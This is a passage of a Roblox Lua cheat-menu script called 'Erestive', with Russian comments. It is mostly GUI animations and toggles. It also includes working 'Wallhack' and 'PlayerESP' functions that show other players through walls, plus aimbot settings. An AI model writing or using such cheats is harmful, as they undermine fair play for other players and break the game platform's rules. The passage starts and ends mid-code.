			if Value.Value == true then
				Value.Value = false
			else
				Value.Value = true
			end
		end
	end)
	
end;
task.spawn(C_3e7);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV.Animations
local function C_3f6()
local script = G2L["3f6"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_3f6);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV.Button.LocalScript
local function C_3fa()
local script = G2L["3fa"];
	-- Объявляем глобальную переменную
	local Enabled = false
	while wait(0.001) do
		if Enabled == true then
			game.Lighting.TimeOfDay = script.Parent.Parent.Parent.FOVSet.Text
		end
		script.Parent.MouseButton1Click:Connect(function()
			if Enabled == true then
				Enabled = false
				script.Parent.Parent.Parent.SetFOV.BackgroundColor3 = Color3.new(0.164706, 0, 0)
			else
				Enabled = true
				script.Parent.Parent.Parent.SetFOV.BackgroundColor3 = Color3.new(0, 0.164706, 0.0196078)
			end
	
			-- Анимация успеха
			local successNotification = script.Parent.Parent.Parent.FOVSuccess
			successNotification:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			successNotification:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
		end)
	end
end;
task.spawn(C_3fa);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV.Button.Animations
local function C_3fb()
local script = G2L["3fb"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_3fb);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.FOVSet.LocalScript
local function C_406()
local script = G2L["406"];
	local TextBox = script.Parent
	
	-- Обработчик события FocusLost
	TextBox.FocusLost:Connect(function()
		local inputText = TextBox.Text
	
		-- Проверяем к��ждую букву и оставляем только цифры
		local filteredText = ""
		for i = 1, #inputText do
			local char = string.sub(inputText, i, i)
	
			if string.match(char, "%d") then -- Оставляем только цифры
				filteredText = filteredText .. char
			end
		end
	
		-- Устанавливаем очищенный текст обратно в TextBox
		TextBox.Text = filteredText
	end)
end;
task.spawn(C_406);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Animations
local function C_408()
local script = G2L["408"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_408);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.Animations
local function C_40c()
local script = G2L["40c"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_40c);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.Wallhack
local function C_40e()
local script = G2L["40e"];
	local debounce = true
	local status = false
	local active = true
	local ON_OFF = script.Parent.Parent.Parent.Parent.Parent.Parent.ONOFF2.OnOrOff 
	
	local surfaceTemplate = script.Parent.surface 
	
	-- Функция для получения цвета в зависимости от HP
	local function GetHealthColor(humanoid)
		local healthPercent = humanoid.Health / humanoid.MaxHealth
		-- Интерполяция от красного (0 HP) к зеленому (Full HP)
		return Color3.new(1, 0, 0):Lerp(Color3.new(0, 1, 0), healthPercent)
	end
	
	function CreateESP()
		for _, player in pairs(game.Players:GetChildren()) do
			if player.Character and player.Name ~= game.Players.LocalPlayer.Name then
				local hum = player.Character:FindFirstChildOfClass("Humanoid")
				if hum then
					-- Вычисляем цвет один раз для всего персонажа
					local hpColor = GetHealthColor(hum)
	
					for _, part in pairs(player.Character:GetChildren()) do
						if part:IsA("BasePart") then
							-- Список сторон для создания
							local faces = {
								Enum.NormalId.Front, Enum.NormalId.Back, 
								Enum.NormalId.Left, Enum.NormalId.Right, 
								Enum.NormalId.Top, Enum.NormalId.Bottom
							}
	
							for _, face in pairs(faces) do
								local gui = surfaceTemplate:Clone()
								gui.Parent = part
								gui.Face = face
	
								-- Ищем внутри шаблона Frame или объект, который нужно покрасить
								-- Если твой шаблон - это просто Frame внутри SurfaceGui:
								local frame = gui:FindFirstChildOfClass("TextLabel")
								if frame then
									frame.BackgroundColor3 = hpColor
								else
									-- Если цвет должен быть у самого SurfaceGui (через CanvasGroup или т.п.)
									gui.BackgroundColor3 = hpColor
								end
							end
						end
					end
				end
			end
		end
	end
	
	function ClearESP()
		for _, player in pairs(game.Players:GetChildren()) do
			if player.Character then
				for _, part in pairs(player.Character:GetChildren()) do
					if part:IsA("BasePart") then
						for _, gui in pairs(part:GetChildren()) do
							-- Проверяем, что это именно наш ESP (чтобы не удалить лишнее)
							if gui:IsA("SurfaceGui") and gui.Name == surfaceTemplate.Name then
								gui:Destroy()
							end
						end
					end
				end
			end
		end
	end
	
	ON_OFF.Changed:Connect(function()
		local currentText = ON_OFF.Text
		if currentText == "On" and debounce and active then
			debounce = false
			status = true
			CreateESP()
		elseif currentText == "Off" and debounce and active then
			debounce = false
			status = false
			ClearESP()
		end
		debounce = true
	end)
	
	while true do
		task.wait(1.5) -- Используй task.wait, он стабильнее
		if status == true then
			ClearESP()
			CreateESP()
		else
			ClearESP()
		end
	end
	
end;
task.spawn(C_40e);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.PlayerESP
local function C_40f()
local script = G2L["40f"];
	local Players = game:GetService("Players")
	local localPlayer = Players.LocalPlayer
	
	local debounce = true
	local status = false
	local active = true
	local ON_OFF = script.Parent.Parent.Parent.Parent.Parent.Parent.ONOFF2.OnOrOff 
	
	-- Ссылка на твой градиент
	local gradientTemplate = script.Parent:FindFirstChild("UIGradient")
	
	-- Функция для получения цвета от HP (Красный -> Зеленый)
	local function GetHealthColor(humanoid)
		local healthPercent = math.clamp(humanoid.Health / humanoid.MaxHealth, 0, 1)
		return Color3.new(1, 0, 0):Lerp(Color3.new(0, 1, 0), healthPercent)
	end
	
	function CreateESP()
		for _, player in pairs(Players:GetPlayers()) do
			-- Рисуем только для других живых игроков
			if player.Character and player ~= localPlayer then
				local head = player.Character:FindFirstChild("Head")
				local hum = player.Character:FindFirstChildOfClass("Humanoid")
	
				if head and hum then
					local hpColor = GetHealthColor(hum)
	
					-- 1. Создаем BillboardGui (Контейнер над головой)
					local bGui = Instance.new("BillboardGui")
					bGui.Name = "PlayerESP"
					bGui.Size = UDim2.new(4, 0, 5, 0) -- Фиксированный размер
					bGui.StudsOffset = Vector3.new(0, 3, 0) -- Высота над игроком
					bGui.AlwaysOnTop = true -- Видно сквозь стены
					bGui.MaxDistance = 250 
					bGui.Parent = head
	
					-- 2. Создаем текст никнейма
					local label = Instance.new("TextLabel")
					label.Name = "NameLabel"
					label.Parent = bGui
					label.Size = UDim2.new(1, 0, 1, 0)
					label.BackgroundTransparency = 1 
					label.TextColor3 = hpColor -- Цвет текста зависит от ХП
					label.Text = player.DisplayName
					label.TextScaled = true
					label.Font = Enum.Font.Roboto
					label.ZIndex = 10
	
					-- 3. Применяем твой градиент
					if gradientTemplate then
						local newGradient = gradientTemplate:Clone()
						newGradient.Parent = label
					end
	
					-- 4. Обводка для читаемости
					local uiStroke = Instance.new("UIStroke")
					uiStroke.Thickness = 0.6
					uiStroke.Color = Color3.new(1, 1, 1) -- Черная обводка
					uiStroke.Parent = label
				end
			end
		end
	end
	
	function ClearESP()
		for _, player in pairs(Players:GetPlayers()) do
			if player.Character and player.Character:FindFirstChild("Head") then
				local existingEsp = player.Character.Head:FindFirstChild("PlayerESP")
				if existingEsp then
					existingEsp:Destroy()
				end
			end
		end
	end
	
	-- Переключатель On/Off
	ON_OFF.Changed:Connect(function()
		if not debounce or not active then return end
		debounce = false
	
		if ON_OFF.Text == "On" then
			status = true
			CreateESP()
		else
			status = false
			ClearESP()
		end
	
		task.wait(0.1) 
		debounce = true
	end)
	
	-- Обновление ХП и проверка новых игроков
	while true do
		task.wait(1.5)
		if status == true then
			ClearESP()
			CreateESP()
		end
	end
	
end;
task.spawn(C_40f);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.FOVSet.LocalScript
local function C_426()
local script = G2L["426"];
	local TextBox = script.Parent
	
	-- Обработчик события FocusLost
	TextBox.FocusLost:Connect(function()
		local inputText = TextBox.Text
	
		-- Проверяем каждую букву и оставляем только цифры
		local filteredText = ""
		for i = 1, #inputText do
			local char = string.sub(inputText, i, i)
	
			if string.match(char, "%d") then -- Оставляем только цифры
				filteredText = filteredText .. char
			end
		end
	
		-- Устанавливаем очищенный текст обратно в TextBox
		TextBox.Text = filteredText
	end)
end;
task.spawn(C_426);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.SetFOV.Animations
local function C_428()
local script = G2L["428"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_428);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.LocalScript
local function C_43c()
local script = G2L["43c"];
	script.Parent.MouseEnter:Connect(function()
		script.Parent.TextLabel.Visible = true
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.TextLabel.Visible = false
	end)
end;
task.spawn(C_43c);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.Slider.Animations
local function C_440()
local script = G2L["440"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_440);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.Slider.Button.LocalScript
local function C_445()
local script = G2L["445"];
	-- Локальный скрипт для обработки события нажатия кнопки
	local button = script.Parent.Parent.Button -- Убедись, что кнопка названа именно так!
	
	button.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.OnOrOff.Text == "On" then
			button.BackgroundColor3 = Color3.new(0.215686, 0, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "Off"
		else
			button.BackgroundColor3 = Color3.new(0.027451, 0.215686, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "On"
		end
	end)
end;
task.spawn(C_445);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.Slider.Animations
local function C_452()
local script = G2L["452"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_452);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.Slider.Button.LocalScript
local function C_457()
local script = G2L["457"];
	-- Локальный скрипт для обработки события нажатия кнопки
	local button = script.Parent.Parent.Button -- Убедись, что кнопка названа именно так!
	
	button.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.OnOrOff.Text == "On" then
			button.BackgroundColor3 = Color3.new(0.215686, 0, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "Off"
		else
			button.BackgroundColor3 = Color3.new(0.027451, 0.215686, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "On"
		end
	end)
end;
task.spawn(C_457);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.FOVConfig.TextButton.LocalScript
local function C_46a()
local script = G2L["46a"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Text == "Head" then
			script.Parent.Text = "HumanoidRootPart"
		else
			script.Parent.Text = "Head"
		end
	end)
	
end;
task.spawn(C_46a);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.FOVSet.LocalScript
local function C_477()
local script = G2L["477"];
	local TextBox = script.Parent
	
	-- Обработчик события FocusLost
	TextBox.FocusLost:Connect(function()
		local inputText = TextBox.Text
	
		-- Проверяем каждую букву и оставляем только цифры
		local filteredText = ""
		for i = 1, #inputText do
			local char = string.sub(inputText, i, i)
	
			if string.match(char, "%d") then -- Оставляем только цифры
				filteredText = filteredText .. char
			end
		end
	
		-- Устанавливаем очищенный текст обратно в TextBox
		TextBox.Text = filteredText
	end)
end;
task.spawn(C_477);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.Animations
local function C_479()
local script = G2L["479"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_479);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.Button.Animations
local function C_47d()
local script = G2L["47d"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_47d);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.TextButton.LocalScript
local function C_486()
local script = G2L["486"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Text == "Legit3" then
			script.Parent.Text = "Legit1"
			script.Parent.Parent.SetFOV.Button.Loca1.Enabled = true
			script.Parent.Parent.SetFOV.Button.Loca2.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca3.Enabled = false
		elseif script.Parent.Text == "Legit1" then
			script.Parent.Text = "Legit2"
			script.Parent.Parent.SetFOV.Button.Loca1.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca2.Enabled = true
			script.Parent.Parent.SetFOV.Button.Loca3.Enabled = false
		elseif script.Parent.Text == "Legit2" then
			script.Parent.Text = "Legit3"
			script.Parent.Parent.SetFOV.Button.Loca1.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca2.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca3.Enabled = true
		end
	end)
	
end;
task.spawn(C_486);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.Slider.Animations
local function C_491()
local script = G2L["491"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_491);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.Slider.Button.LocalScript
local function C_496()
local script = G2L["496"];
	-- Локальный скрипт для обработки события нажатия кнопки
	local button = script.Parent.Parent.Button -- Убедись, что кнопка названа именно так!
	
	button.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.OnOrOff.Text == "On" then
			button.BackgroundColor3 = Color3.new(0.215686, 0, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "Off"
		else
			button.BackgroundColor3 = Color3.new(0.027451, 0.215686, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "On"
		end
	end)
end;
task.spawn(C_496);
-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.LocalScript
local function C_49f()
local script = G2L["49f"];
	-- Получаем нужные компоненты
	local mainContainer = script.Parent.Parent.Parent.CommandFrame -- Контейнер с фреймами
	local buttons = {} -- Таблица для хранения ссылок на кнопки
	
	-- Функция для переключения фреймов
	local function changeFrame(frameToShow)
		-- Сначала прячем все фреймы
		for i, child in ipairs(mainContainer:GetChildren()) do
			if child.ClassName == "ScrollingFrame" then
				child.Visible = false
			end
		end
	
		-- Затем показываем указанный фрейм
		frameToShow.Visible = true
	end
	
	-- Назначаем кнопки и привязываем события
	for _, button in ipairs(script.Parent:GetChildren()) do
		if button.ClassName == "TextButton" then
			table.insert(buttons, button)
	
			-- Привязываем событие к каждой кнопке
			button.MouseButton1Click:Connect(function()
				-- Определяем номер фрейма по порядковому номеру кнопки
				local index = table.find(buttons, button)
				local targetFrame = mainContainer["Frame"..index]
	
				-- Меняем фрейм
				changeFrame(targetFrame)
			end)
		end
	end
	
end;
task.spawn(C_49f);
-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.1Frame.LocalScript
local function C_4a4()
local script = G2L["4a4"];
	local tweenService = game:GetService("TweenService")
	local selectedButton = nil -- Переменная для хранения последней выбранной кнопки
	
	-- Функция анимации кнопки
	local function animateButton(button, isSelected)
		local uiStroke = button.UIStroke
		local textLabel = button.TextLabel
		local imageLabel = button.Image -- Новый компонент ImageLabel
	
		local info = TweenInfo.new(
			0.3, -- Длительность анимации
			Enum.EasingStyle.Sine,
			Enum.EasingDirection.Out
		)
	
		local goalStroke = {}
		local goalText = {}
	
		if isSelected then
			-- Активируем стиль при выборе кнопки
			button.TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Белый текст
			goalStroke.Color = Color3.fromRGB(255, 255, 255) -- Выбранный цвет
			button.BackgroundTransparency = 0.6
			goalStroke.Thickness = 0.6
			goalText.TextSize = 20
			imageLabel.ImageColor3 = Color3.fromRGB(255, 255, 255) -- Цвет иконки при выборе
		else
			-- Сбрасываем стиль обратно
			button.TextLabel.TextColor3 = Color3.fromRGB(68, 67, 65) -- Белый текст
			button.BackgroundTransparency = 1
			goalStroke.Color = Color3.fromRGB(68, 67, 65) -- Исходный черный цвет
			goalStroke.Thickness = 0.6
			goalText.TextSize = 16
			imageLabel.ImageColor3 = Color3.fromRGB(68, 67, 65) -- Белый цвет иконки по умолчанию
		end
	
		local tweenStroke = tweenService:Create(uiStroke, info, goalStroke)
		local tweenText = tweenService:Create(textLabel, info, goalText)
	
		tweenStroke:Play()
		tweenText:Play()
	end
	
	-- Подключаем событие MouseButton1Click ко всем TextButtons
	for _, button in ipairs(script.Parent.Parent:GetChildren()) do
		if button.ClassName == "TextButton" then
			button.MouseButton1Click:Connect(function()
				if selectedButton then
					animateButton(selectedButton, false) -- Снимаем выделение с прошлой кнопки
				end
	
				selectedButton = button -- Запоминаем новую активную кнопку
				animateButton(selectedButton, true) -- Применяем новый стиль к текущей кнопке
			end)
		end
	end
end;
task.spawn(C_4a4);
-- StarterGui.Erestive.MainFrame.NavFrame.3Frame.TextLabel.LocalScript
local function C_4e1()
local script = G2L["4e1"];
	local tweenService = game:GetService("TweenService")
	
	script.Parent.MouseEnter:Connect(function()
	    local uiStroke = script.Parent.UIStroke
	    local textLabel = script.Parent -- Предположим, что текст находится в TextLabel
	
	    local info = TweenInfo.new(
	        0.3, -- длительность анимации
	        Enum.EasingStyle.Sine,
	        Enum.EasingDirection.Out
	    )
	
	    local goalStroke = {
	        Thickness = 3.5,
	        Color = Color3.fromRGB(38, 39, 131) -- синий цвет RGB(0, 122, 204)
	    }
	
	    local goalText = {
	        TextSize = 34 -- увеличим размер текста до 24 пунктов
	    }
	
	    local tweenStroke = tweenService:Create(uiStroke, info, goalStroke)
	    local tweenText = tweenService:Create(textLabel, info, goalText)
	
	    tweenStroke:Play()
	    tweenText:Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
	    local uiStroke = script.Parent.UIStroke
	    local textLabel = script.Parent -- Предположим, что текст находится в TextLabel
	
	    local info = TweenInfo.new(
	        0.3, -- длительность анимации
	        Enum.EasingStyle.Sine,
	        Enum.EasingDirection.Out
	    )
		
	    local goalStroke = {
	        Thickness = 2,
			Color = Color3.fromRGB(30, 31, 35) -- чёрный цвет RGB(0, 0, 0)
	    }
	
	    local goalText = {
			TextSize = 24 -- возвращаем размер текста к стандартному (предположим, стандартный размер 18)
	    }
	
	    local tweenStroke = tweenService:Create(uiStroke, info, goalStroke)
	    local tweenText = tweenService:Create(textLabel, info, goalText)
	
	    tweenStroke:Play()
	    tweenText:Play()
	end)
end;
task.spawn(C_4e1);
-- StarterGui.Erestive.MainFrame.Frame.UIDrag
local function C_506()
local script = G2L["506"];
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent.Parent.Parent.MainFrame
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_506);
-- StarterGui.Erestive.MainFrame.cfg.TextButton.LocalScript
local function C_517()
local script = G2L["517"];
	script.Parent.MouseButton1Click:Connect(function()
			script.Parent.Parent.Parent.cfg.Visible = false
